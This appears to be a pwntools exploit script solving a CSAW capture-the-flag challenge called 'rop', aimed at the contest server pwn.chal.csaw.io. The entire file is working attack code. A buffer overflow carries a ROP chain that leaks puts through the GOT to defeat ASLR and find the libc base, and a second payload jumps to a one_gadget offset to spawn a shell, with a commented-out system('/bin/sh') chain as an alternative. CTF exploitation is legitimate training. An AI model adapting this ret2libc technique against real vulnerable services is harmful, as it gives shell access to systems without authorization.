#!/usr/bin/env python3

from pwn import *
from time import sleep

_FILE = "./rop"

p = process(_FILE) #, env = {'LD_PRELOAD' : './libc-2.27.so'})
p = remote("pwn.chal.csaw.io", 5016)

binary = context.binary = ELF(_FILE, checksec=False)
_LIBC = ELF("./libc-2.27.so")
#_LIBC = binary.libc

#gdb.attach(p.pid)


puts_addr_call = binary.plt['puts'] #0x4005f5

pop_rdi = 0x00400683

payload = cyclic(40, n=8) + p64(pop_rdi) + p64(binary.got['puts']) + p64(puts_addr_call) + p64(binary.sym['main'])

p.sendline(payload)
print(1,p.recvuntil("Hello\n"))
puts_addr = u64(p.recvline().decode("latin-1").strip().ljust(8, "\x00"))

_LIBC.address = puts_addr - _LIBC.sym["puts"]

log.info(f"Puts address: {hex(puts_addr)}")

log.info(f"Libc address: {hex(_LIBC.address)}")

binsh = next(_LIBC.search(b"/bin/sh"))

payload = cyclic(40, n=8) + p64(_LIBC.address + 0x4f2c5) # + p64(pop_rdi) + p64(binsh) + p64(_LIBC.sym["system"]) + p64(binary.sym['main']) #+ p64(_LIBC.address + 0x10A45C)

p.sendline(payload)

p.interactive()


